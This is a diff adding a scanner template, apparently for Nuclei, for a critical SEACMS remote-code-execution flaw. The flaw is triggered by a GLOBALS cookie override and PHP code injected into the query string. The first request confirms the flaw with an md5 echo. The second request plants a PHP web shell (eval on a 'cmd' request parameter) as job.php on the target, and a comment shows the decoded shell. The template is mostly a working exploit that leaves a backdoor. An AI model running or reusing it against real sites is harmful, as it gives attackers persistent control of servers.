@@ -1,0 +1,47 @@
+id: seacms-sql-class-getshell
+info:
+  name: SEACMS sql.class.php GetShell
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The incomplete filtering in the latest version of seacms can bypass the new version of variable coverage and getshell.
+  reference:
+    - https://xz.aliyun.com/t/6191
+  tags: rce
+
+variables:
+  check_string: "5219678c787e30bc11191474593749d8"
+  shell_code: "PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsgPz4=" # <?php eval($_REQUEST['cmd']); ?>
+
+http:
+  - raw:
+      - |
+        GET /?*/echo(md5('This%20is%20my%20job'));@unlink(__FILE__);/* HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: GLOBALS[db_host]=1
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{check_string}}"
+      - type: word
+        part: body
+        words:
+          - "mysqli_error_trace.php"
+
+  - raw:
+      - |
+        GET /?*/echo(md5('This%20is%20my%20job'));file_put_contents('job.php',base64_decode('{{shell_code}}'));@unlink(__FILE__);/* HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: GLOBALS[db_host]=1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{check_string}}"
+          - "job.php"
